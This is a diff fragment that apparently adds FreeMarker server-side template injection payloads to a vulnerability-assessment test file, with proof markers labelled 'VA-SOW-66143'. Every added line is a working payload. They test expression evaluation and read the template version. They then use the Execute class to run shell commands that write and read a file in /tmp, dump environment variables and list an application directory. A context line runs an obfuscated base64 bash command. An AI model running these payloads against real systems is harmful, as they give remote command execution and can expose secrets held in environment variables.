@@ -75,3 +75,13 @@ printf '%s' 'echo "ssti-webroot-proof $(hostname) $(date +%s)" > /usr/local/tomc
 
 
 [VA-WRITE] ${'freemarker.template.utility.Execute'?new()('echo ZWNobyAic3N0aS13cml0ZS1wcm9vZiBob3N0PSQoaG9zdG5hbWUpIHVzZXI9JChpZCAtdW4pIHRpbWU9JChkYXRlICslcykiID4gL3RtcC9WQV9TT1dfNjYxNDMudHh0IDI+JjE7IGVjaG8gV1JJVEVfRVhJVD0kPzsgbHMgLWxhIC90bXAvVkFfU09XXzY2MTQzLnR4dDsgY2F0IC90bXAvVkFfU09XXzY2MTQzLnR4dAo= | base64 -d | bash')?base64}
+
+[SB][#assign v = 7*7]SBRESULT=${v}
+[VER]${.version}
+
+[W1] ${'freemarker.template.utility.Execute'?new()('echo VA-SOW-66143 write proof > /tmp/VA_SOW_66143.txt')}
+[W2] ${'freemarker.template.utility.Execute'?new()('ls -la /tmp/VA_SOW_66143.txt')}
+[W3] ${'freemarker.template.utility.Execute'?new()('cat /tmp/VA_SOW_66143.txt')}
+
+[E1] ${'freemarker.template.utility.Execute'?new()('env')}
+[E2] ${'freemarker.template.utility.Execute'?new()('ls -la /usr/src/myapp')}
